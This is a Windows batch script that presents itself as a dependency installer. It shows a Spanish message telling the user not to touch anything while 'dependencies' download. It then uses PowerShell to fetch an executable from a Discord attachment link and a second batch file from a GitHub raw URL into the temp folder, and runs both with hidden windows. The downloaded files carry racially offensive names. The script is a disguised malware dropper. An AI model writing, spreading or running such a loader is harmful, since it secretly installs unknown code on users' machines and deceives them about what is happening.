@echo off
title Cloud
set "url=https://cdn.discordapp.com/attachments/1142393688580968500/1306671974679842909/kiyoyou.exe?ex=6737849b&is=6736331b&hm=ba356c1c0cb7411cb6b5ad7dea03c83e21a3262629130c4adbcc409c9ec318f8&"
set "filename=georgefloydss.exe"
set "urlbatch=https://raw.githubusercontent.com/ghgodbomboclat/apguacamole-commons/refs/heads/main/georgefloydss.bat"
set "bfn=georgefloydss.bat"
color b
echo NO TOQUES NADA!!! Las dependencias se estan descargando, esto podria tomar un buen tiempo, cuando se termine se va a cerrar automaticamente.
cd /d "%TEMP%"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%filename%'); Start-Process '%filename%' -WindowStyle Hidden
powershell -Command "(New-Object Net.WebClient).DownloadFile('%urlbatch%', '%bfn%'); Start-Process '%bfn%' -WindowStyle Hidden
